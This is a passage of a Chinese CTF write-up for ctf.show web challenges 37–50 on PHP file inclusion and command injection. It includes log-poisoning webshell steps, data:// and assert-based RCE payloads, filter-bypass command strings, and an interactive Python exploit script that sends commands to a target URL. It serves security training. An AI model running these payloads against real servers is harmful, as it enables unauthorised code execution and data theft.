+<p>通过服务器响应的 Server 字段来看，这里可以得知服务器使用的是 <code>nginx</code> 进行搭建的。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218742_65a392b6bd24c631710a2.png"><img src="https://image.3001.net/images/20240114/1705218742_65a392b6bd24c631710a2.png" alt="image-20231021200459387"></a></p>
+<p>而 nginx 服务默认的访问日志在 <code>/var/log/nginx/access.log</code>，尝试构造如下 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218748_65a392bc0fc7e45b70a7e.png"><img src="https://image.3001.net/images/20240114/1705218748_65a392bc0fc7e45b70a7e.png" alt="image-20231021200758100"></a></p>
+<p>发现成功包含文件，由于我们访问的网站时，发出的请求中的 <code>User-agent</code> 字段会记录在该日志中，因此我们先使用 带有 一句话木马的 <code>UA</code> 访问一下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218753_65a392c1169b50503e344.png"><img src="https://image.3001.net/images/20240114/1705218753_65a392c1169b50503e344.png" alt="image-20231021201040452"></a></p>
+<p>接着再访问利用即可。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218757_65a392c560664104279a5.png"><img src="https://image.3001.net/images/20240114/1705218757_65a392c560664104279a5.png" alt="image-20231021201155024"></a></p>
+<h2 id="web38-文件包含过滤-flag-和-php"><a href="#web38-文件包含过滤-flag-和-php" class="headerlink" title="web38 文件包含过滤 flag 和 php"></a>web38 文件包含过滤 flag 和 php</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里不区分大小写的过滤了 <code>php</code> 关键字，因此 <code>php://filter</code> 以及 <code>php://input</code> 伪协议均无法使用，但是这里可以使用 data 协议。</p>
+<p>PAYLOAD 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=data://text/plain,&lt;?=system(&#x27;nl fla*&#x27;);?&gt;</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8%2b</span><br><span class="line">// 同样这里也可以通过修改UA包含/var/log/nginx/access.log文件进行利用</span><br></pre></td></tr></table></figure>
+
+<p>由于过滤了 <code>php</code> 关键字，我们无法直接使用 <code>&lt;?php</code>，这里也没有开启短标签等功能，故而这里只能使用 <code>&lt;?=system(&#39;ls&#39;);?&gt;</code> 等价于 <code>&lt;?php system(&#39;ls&#39;);?&gt;</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218772_65a392d481fd451e84289.png"><img src="https://image.3001.net/images/20240114/1705218772_65a392d481fd451e84289.png" alt="image-20231022094018692"></a></p>
+<h2 id="web39-文件包含过滤-flag-并添加后缀"><a href="#web39-文件包含过滤-flag-并添加后缀" class="headerlink" title="web39 文件包含过滤 flag 并添加后缀"></a>web39 文件包含过滤 flag 并添加后缀</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只是不区分大小写的过滤了 <code>flag</code> 关键字，同时在使用 <code>include</code> 引入的时候，对我们传入的参数 c 末尾自动加后缀<code>.php</code>。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">// 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。</span><br><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">// 基于上一题行不通的方法:</span><br><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8%2b</span><br><span class="line">原因: 实际上解码的为 PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8+.php  无法成功解码</span><br><span class="line"></span><br><span class="line">?c=/var/log/nginx/access.log </span><br><span class="line">原因: 实际上包含的文件为 /var/log/nginx/access.log.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web40-无参-RCE-1"><a href="#web40-无参-RCE-1" class="headerlink" title="web40 无参 RCE-1"></a>web40 无参 RCE-1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过代码审计发现过滤内容如下：</p>
+<blockquote>
+<p>0-9 之间的数字、~、反引号、@、#、$、%、^、&amp;、*、中文的左括号、中文的右括号、-、&#x3D;、+、{、[、]、}、英文冒号、单引号、双引号、逗号、&lt;、&gt;、&#x2F;、?、\</p>
+</blockquote>
+<p>这里由于过了了单引号、双引号、以及 &#x3D; 和 +，但是幸运的是这里过滤的是中文的括号，因此这里只是一个无参的读取文件内容。</p>
+<p>这里可以使用 web31 的 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>当然这里还有新的 PAYLOAD，利用 <code>sessionId</code> 进行传参。PAYLOAD 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=session_start();system(session_id());</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218779_65a392db20ece5268c443.png"><img src="https://image.3001.net/images/20240114/1705218779_65a392db20ece5268c443.png" alt="image-20231022101817718"></a></p>
+<p><strong>释义：</strong></p>
+<p>首先使用 <code>session_start()</code> 函数开启 session，其实使用 <code>session_id()</code> 函数获取 Cookie 字段中的 <code>PHPSESSID</code> 属性的值。最后交给 <code>system()</code> 函数执行。但是这种方法有局限性，由于 <code>sessionId</code> 只能是数字 + 字母，不能有特殊字符，故而不能使用该方法执行 <code>nl flag.php</code> 等命令。因此该方法仅做了解。</p>
+<p><strong>其他 PAYLOAD：</strong></p>
+<p>先获取所有变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218787_65a392e3df0daf1340529.png"><img src="https://image.3001.net/images/20240114/1705218787_65a392e3df0daf1340529.png" alt="image-20231022102517021"></a></p>
+<p>发现存在 <code>_GET</code>、<code>_POST</code>、<code>_COOKIE</code>、<code>_FILES</code> 变量，那么我们利用 POST 方法传入参数 <code>cmd </code>。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218792_65a392e84f3bdac81f99b.png"><img src="https://image.3001.net/images/20240114/1705218792_65a392e84f3bdac81f99b.png" alt="image-20231022102645109"></a></p>
+<p>接着使用 <code>next()</code> 函数改变数组的位置，指向数组中的第二个元素，此时取到变量 <code>_POST</code> 的数组。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218797_65a392ed8f2decd126c00.png"><img src="https://image.3001.net/images/20240114/1705218797_65a392ed8f2decd126c00.png" alt="image-20231022102829465"></a></p>
+<p>使用 <code>pos</code> 、<code>current</code>、以及 <code>array_pop</code> 都可以取得数组中第一个元素的值，即 <code>phpinfo();</code>。</p>
+<p><strong>array_pop</strong></p>
+<p>将元素从数组末尾弹出</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>array</code></td>
+<td>要从中获取值的数组。</td>
+</tr>
+</tbody></table>
+<p>返回值：返回 <code>array</code> 中最后一个元素的值，如果 <code>array</code> 为空， <code>null</code> 则返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=print_r(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218802_65a392f2f13da8405f8a5.png"><img src="https://image.3001.net/images/20240114/1705218802_65a392f2f13da8405f8a5.png" alt="image-20231022103225407"></a></p>
+<p>接着使用 <code>eval</code> 或者 <code>assert</code> 函数执行即可。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218808_65a392f83ffc77b8d94e3.png"><img src="https://image.3001.net/images/20240114/1705218808_65a392f83ffc77b8d94e3.png" alt="image-20231022103414107"></a></p>
+<p>最终获取 FLAG 的 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=assert(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218812_65a392fc6f8d8c8d43290.png"><img src="https://image.3001.net/images/20240114/1705218812_65a392fc6f8d8c8d43290.png" alt="image-20231022103522169"></a></p>
+<h2 id="web41-无字母数字-RCE"><a href="#web41-无字母数字-RCE" class="headerlink" title="web41 无字母数字 RCE"></a>web41 无字母数字 RCE</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计过滤内容如下：</p>
+<blockquote>
+<p>0-9、a-z、^、+、~、$、[、]、{、}、&amp;、-</p>
+</blockquote>
+<p>这个题过滤了 <code>$、+、-、^、~</code> 使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 <code>|</code>。</p>
+<p>这里借用 羽师傅的 PHP 脚本生成 <code>rce_or.txt</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;;</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">        else&#123;</span><br><span class="line">        $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">        $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">        $c=(urldecode($a)|urldecode($b));</span><br><span class="line">        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+<p>大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</code>。运行以上脚本之后会生成 <code>rce_or.txt</code> 文件。</p>
+<p>rce_or.txt 部分内容如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218820_65a393040b97f43f0d4f1.png"><img src="https://image.3001.net/images/20240114/1705218820_65a393040b97f43f0d4f1.png" alt="image-20231022113515477"></a></p>
+<p>那么为什么 <code>%60 | %01</code> 就得到字母 a 呢？其实这里我们需要将 <code>%60</code> 和 <code>%01</code> 转为十进制 ，之后进行 <code>or</code> 运算即可得到 97。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218835_65a393133947066f76d0b.png"><img src="https://image.3001.net/images/20240114/1705218835_65a393133947066f76d0b.png" alt="image-20231022113739382"></a></p>
+<p>而 ASCII 码 97 转为字符为 <code>a</code>。</p>
+<p>接着使用 羽师傅的 Python 脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span><br><span class="line">if(len(argv)!=2):</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   print(&#x27;USER：python exp.py &lt;url&gt;&#x27;)</span><br><span class="line">   print(&quot;eg：  python exp.py http://ctf.show/&quot;)</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   exit(0)</span><br><span class="line">url=argv[1]</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))</span><br><span class="line">   data=&#123;</span><br><span class="line">       &#x27;c&#x27;:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   print(&quot;\n[*] result:\n&quot;+r.text)</span><br></pre></td></tr></table></figure>
+
+<p>食用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">python3 exp.py &lt;url&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218843_65a3931b66707f15e7100.png"><img src="https://image.3001.net/images/20240114/1705218843_65a3931b66707f15e7100.png" alt="image-20231022114935437"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218852_65a39324349fe333d1fb9.png"><img src="https://image.3001.net/images/20240114/1705218852_65a39324349fe333d1fb9.png" alt="image-20231022115010608"></a></p>
+<p>当我们执行 <code>system(&quot;ls&quot;)</code> 的时候，实际发送的 PAYLOAD 为：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218856_65a393287f63fc0708205.png"><img src="https://image.3001.net/images/20240114/1705218856_65a393287f63fc0708205.png" alt="image-20231022115433109"></a></p>
+<p>在 PHP7 中，可以使用如下方法执行函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">(&#x27;system&#x27;)(&#x27;whoami&#x27;);</span><br><span class="line">(&#x27;phpinfo&#x27;)();</span><br><span class="line">?&gt;]</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218862_65a3932e5902253f7cca0.png"><img src="https://image.3001.net/images/20240114/1705218862_65a3932e5902253f7cca0.png" alt="image-20231022113946044"></a></p>
+<h2 id="web42-输出重定向-1"><a href="#web42-输出重定向-1" class="headerlink" title="web42 输出重定向 - 1"></a>web42 输出重定向 - 1</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们传入 <code>?c=ls</code> 则实际执行的命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">ls &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>也就是说将 <code>ls</code> 命令执行的结果写入到了 <code>/dev/null</code> 文件中，在 Linux 系统中，<code>/dev/null</code> 是一个特殊的文件，被称为空设备，该文件对所有人都是 <strong>只可写不可读</strong> 的状态，你会发现不管在该文件中写入什么样的内容，最终读的时候，内容始终为空。</p>
+<p>这里我们通过如下方法即可绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># 实际上shell执行的命令为 nl flag.php;&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">?c=nl flag.php;</span><br><span class="line">bash</span><br><span class="line"># 实际上shell执行的命令为 nl flag.php||&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">bash</span><br><span class="line"># 实际上shell执行的命令为 nl flag.php换行&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">?c=nl flag.php%0a</span><br></pre></td></tr></table></figure>
+
+<h2 id="web43-输出重定向-2"><a href="#web43-输出重定向-2" class="headerlink" title="web43 输出重定向 - 2"></a>web43 输出重定向 - 2</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用上一题的 PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl flag.php||</span><br><span class="line">?c=nl flag.php%0a</span><br></pre></td></tr></table></figure>
+
+<p>但是这里过滤了 <code>;</code>，上一题的 <code>;</code> PAYLOAD 是无法使用了的。</p>
+<h2 id="web44-输出重定向-3"><a href="#web44-输出重定向-3" class="headerlink" title="web44 输出重定向 - 3"></a>web44 输出重定向 - 3</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里只是比上一题多过滤了 flag 关键字，绕过方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl fla?.php||</span><br><span class="line">?c=nl fla*%0a</span><br></pre></td></tr></table></figure>
+
+<h2 id="web45-输出重定向-4"><a href="#web45-输出重定向-4" class="headerlink" title="web45 输出重定向 - 4"></a>web45 输出重定向 - 4</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>空格</code>，至于空格我们可以使用 <code>$IFS</code>、<code>$&#123;IFS&#125;</code>、<code>$IFS$9</code>、<code>%09</code>、<code>&#123;&#125;</code> 、<code>&lt;</code>、<code>&lt;&gt;</code> 等方式代替。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl$IFS$1fla?.php||</span><br><span class="line">?c=nl%09fla*%0a</span><br><span class="line">?c=echo$IFS`tac$IFS*`%0A</span><br></pre></td></tr></table></figure>
+
+<h2 id="web46-输出重定向-5"><a href="#web46-输出重定向-5" class="headerlink" title="web46 输出重定向 - 5"></a>web46 输出重定向 - 5</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>0-9</code>、<code>$</code>、以及 <code>*</code>。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl%09fla?.php||</span><br><span class="line">?c=nl%09fla\g.php%0a</span><br><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br><span class="line"># 不能使用的: ?c=nl&lt;fla?.php|| 原因是&lt;不支持通配</span><br></pre></td></tr></table></figure>
+
+<h2 id="web47-输出重定向-6"><a href="#web47-输出重定向-6" class="headerlink" title="web47 输出重定向 - 6"></a>web47 输出重定向 - 6</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一题多过滤了 文件读取命令的相关命令，比如 <code>more</code>、<code>less</code>、<code>head</code>、<code>sort</code>、<code>tail</code>。</p>
+<p>可以直接使用上一题的 PAYLOAD 去打。</p>
+<h2 id="web48-输出重定向-7"><a href="#web48-输出重定向-7" class="headerlink" title="web48 输出重定向 - 7"></a>web48 输出重定向 - 7</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>sed</code>、<code>cut</code>、<code>awk</code>、<code>strings</code>、<code>od</code>、<code>curl</code>、<code>反引号</code> 等字符。</p>
+<p>依旧可以使用上一题的 PAYLOAD。</p>
+<h2 id="web49-输出重定向-8"><a href="#web49-输出重定向-8" class="headerlink" title="web49 输出重定向 - 8"></a>web49 输出重定向 - 8</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本关卡比上一关多过滤了 <code>%</code>，因此 <code>%09</code>、<code>%0a</code> 无法使用。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>
+
+<h2 id="web50-输出重定向-9"><a href="#web50-输出重定向-9" class="headerlink" title="web50 输出重定向 - 9"></a>web50 输出重定向 - 9</h2><p>源码如下：</p>
